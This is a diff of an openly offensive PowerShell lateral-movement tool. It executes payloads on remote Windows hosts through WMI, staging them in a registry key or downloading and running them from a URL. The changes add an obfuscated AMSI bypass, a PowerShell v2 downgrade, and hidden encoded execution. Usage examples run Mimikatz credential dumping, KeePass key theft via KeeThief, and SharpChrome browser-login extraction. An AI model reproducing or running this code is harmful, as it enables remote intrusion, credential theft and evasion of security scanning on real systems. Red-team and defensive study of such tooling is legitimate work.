@@ -34,7 +34,7 @@
     PS C:\> Invoke-PowerExec -Type PSScript -File .\Invoke-Mimikatz.ps1 -Arguments 'Invoke-Mimikatz -DumpCreds' -Hosts '192.168.0.1'
 
 .EXAMPLE
-    PS C:\> Invoke-PowerExec -Type PSScript -URL 'http://192.168.0.10/KeeTheft.ps1' -Arguments 'Get-KeePassDatabaseKey' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator
+    PS C:\> Invoke-PowerExec -Type PSScript -URL 'http://192.168.0.10/KeeThief.ps1' -Arguments 'Get-KeePassDatabaseKey' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator
 
 .EXAMPLE
     PS C:\> Invoke-PowerExec -Type NETAssembly -File .\SharpChrome.exe -Arguments 'logins','/unprotect','/format:table' -Hosts $(gc hosts.txt) -Credential ADATUM\Administrator
@@ -68,39 +68,49 @@
 		$Credential = [System.Management.Automation.PSCredential]::Empty
 	)
 
-	ForEach($ComputerName in $Hosts) {
-		If ($File) {
-			# Upload the payload
-			$bytes = [IO.File]::ReadAllBytes((Resolve-Path $File))
-			$RegValue = [System.Convert]::ToBase64String($bytes)
-			$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
-			$RegHive = 2147483650
-			$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
-			$RegKey = 'RunMe'
-			Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name SetStringValue $RegHive, $RegPath, $RegValue, $RegKey -ComputerName $ComputerName -Credential $Credential | Out-Null			
-			# Retrieve the payload and run it
-			$Script = '$EncCode = (Get-ItemProperty -Path "' + $RegistryPath + '").' + "$RegKey" + '; $Code = [System.Convert]::FromBase64String($EncCode); '
-			If($Type -eq 'PSScript') {
-				$Script = $Script + '[System.Text.Encoding]::UTF8.GetString($Code) | Invoke-Expression; ' + "$Arguments"
-			} ElseIf($Type -like 'NETAssembly') {
-				$Arguments = ($Arguments -join '","')
-				$Script = $Script + '$Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = "' + $Arguments + '"; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
-			}
-			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
-			Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
-		} ElseIf ($URL) {
-			# Download the payload and run it
-			$Script = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object Net.WebClient; $client.Proxy = [Net.WebRequest]::GetSystemWebProxy(); $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials; '
-			If($Type -eq 'PSScript') {
-				$Script = $Script + '$Code = $client.DownloadString("' + $URL + '"); $Code | Invoke-Expression; ' + "$Arguments"
-			} ElseIf($Type -like 'NETAssembly') {
-				$Arguments = ($Arguments -join '","')
-				$Script = $Script + '$Code = $client.DownloadData("' + $URL + '"); $Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = "' + $Arguments + '"; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
-			}
-			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
-		} Else {
-			Write-Error 'File or URL argument missing'
+	$EncArgs = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Arguments))
+	$Arguments = ($Arguments -join "','")
+
+	If ($File) {
+		# Registry settings used to store the payload
+		$bytes = [IO.File]::ReadAllBytes((Resolve-Path $File))
+		$RegValue = [System.Convert]::ToBase64String($bytes)
+		$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
+		$RegHive = 2147483650
+		$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
+		$RegKey = 'RunMe'
+
+		# Script used to retrieve and run the payload
+		$Script = '$EncCode = (Get-ItemProperty -Path ' + "'$RegistryPath'" + ').' + "'$RegKey'" + '; $Code = [System.Convert]::FromBase64String($EncCode); '
+		If($Type -eq 'PSScript') {
+			$Script = $Script + '$EncArgs = ' + "'$EncArgs'" + '; [System.Text.Encoding]::UTF8.GetString($Code) | Invoke-Expression; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncArgs)) | Invoke-Expression'
+		} ElseIf($Type -like 'NETAssembly') {
+			$Script = $Script + '$Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = ' + "'$Arguments'" + '; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
 		}
+
+		ForEach($ComputerName in $Hosts) {
+			# Upload the payload
+			Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name SetStringValue $RegHive, $RegPath, $RegValue, $RegKey -ComputerName $ComputerName -Credential $Credential | Out-Null
+			# Execute the payload 
+			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
+			# Remove the payload
+			Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
+		}
+	} ElseIf ($URL) {
+		# Script used to download and run the payload
+		$Script = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object Net.WebClient; $client.Proxy = [Net.WebRequest]::GetSystemWebProxy(); $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials; '
+		If($Type -eq 'PSScript') {
+			$Script = $Script + '$EncArgs = ' + "'$EncArgs'" + '; $Code = $client.DownloadString("' + $URL + '"); $Code | Invoke-Expression; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncArgs)) | Invoke-Expression'
+		} ElseIf($Type -like 'NETAssembly') {
+			$Script = $Script + '$Code = $client.DownloadData(' + "'$URL'" + '); $Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = ' + "'$Arguments'" + '; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
+		}
+
+		ForEach($ComputerName in $Hosts) {
+			# Execute the payload
+			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
+		}
+	} Else {
+		Write-Error 'File or URL argument missing'
 	}
 }
 
@@ -121,17 +131,36 @@ function Invoke-WMIExec {
 		$Credential = [System.Management.Automation.PSCredential]::Empty
 	)
 
-	Write-Host "`n[*] Host: $ComputerName"
+	# Get the .NET Framework version
+	$RegHive = 2147483650
+	$RegPath = 'SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727'
+	$RegKey = 'Version'
+	$OldVersion = (Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential).sValue
+
+	# Add AMSI bypass and encode the payload
+	$AmsiBypass = '$Class = ' + "'System.Management.Automation.Am' + 'siUtils'; " + '$Type = [Ref].Assembly.GetType($Class); $field = $Type.GetField(' + "'am' + 'siInitFailed','NonPublic,Static'); " + '$field.SetValue($null,$true); '
+	If (-Not $OldVersion) {
+		$Command = $AmsiBypass + $Command
+	}
+	$EncScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
+	If ($OldVersion) {
+		$Command = "powershell -Version 2 -W Hidden -NonI -NoP -Exec Bypass -Enc $EncScript"
+	} Else {
+		$Command = "powershell -W Hidden -NonI -NoP -Exec Bypass -Enc $EncScript"
+	}
 
 	# Run the command and store the output
 	$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
 	$RegHive = 2147483650
 	$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
 	$RegKey = 'ReadMe'
-	$EncScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
-	$Command = "powershell -Version 2 -Enc $EncScript"
-	$Script = '$Output = ' + "$Command" + ' | Out-String; $EncOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Output)); New-ItemProperty -Path ' + "'$RegistryPath'" + ' -Name ' + "'$RegKey'" + ' -Value $EncOutput -PropertyType String -Force;'
-	$Command = 'powershell.exe -W Hidden -NonI -NoP -Exec Bypass -Command ' + "$Script"
+	$Script = '$Output = ' + "($Command)" + ' | Out-String; $EncOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Output)); New-ItemProperty -Path ' + "'$RegistryPath'" + ' -Name ' + "'$RegKey'" + ' -Value $EncOutput -PropertyType String -Force;'
+	If ($OldVersion) {
+		$Command = 'powershell.exe -Version 2 -W Hidden -NonI -NoP -Exec Bypass -Command ' + "$Script"
+	} Else {
+		$Script = $AmsiBypass + $Script
+		$Command = 'powershell.exe -W Hidden -NonI -NoP -Exec Bypass -Command ' + "$Script"
+	}
 	$Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command -ComputerName $ComputerName -Credential $Credential
 	$ProcessId = $Process.ProcessId
 	Do {
@@ -142,6 +171,9 @@ function Invoke-WMIExec {
 	$EncOutput = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential
 	$Output = [System.Convert]::FromBase64String($EncOutput.sValue)
 	$Output = [System.Text.Encoding]::Unicode.GetString($Output)
+
+	Write-Host "`n[*] Host: $ComputerName"
 	Write-Host $Output
+
 	Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
 }
